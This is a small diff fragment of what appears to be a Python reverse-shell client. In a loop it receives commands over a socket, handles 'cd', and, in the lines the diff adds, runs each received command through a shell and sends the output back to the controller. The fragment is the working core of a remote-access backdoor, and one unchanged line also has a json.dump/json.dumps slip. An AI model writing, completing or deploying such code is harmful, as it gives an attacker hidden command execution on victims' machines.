@@ -12,8 +12,8 @@ while True:
                 os.chdir(command_recv[3:])
                 s.send(json.dump('').encode())
         else:
-          output = subprocess()
-                little bit left ..
+                output = subprocess.check_output(command_recv, shell=True)
+                s.send(json.dumps(output.decode()).encode())            
 
 
   
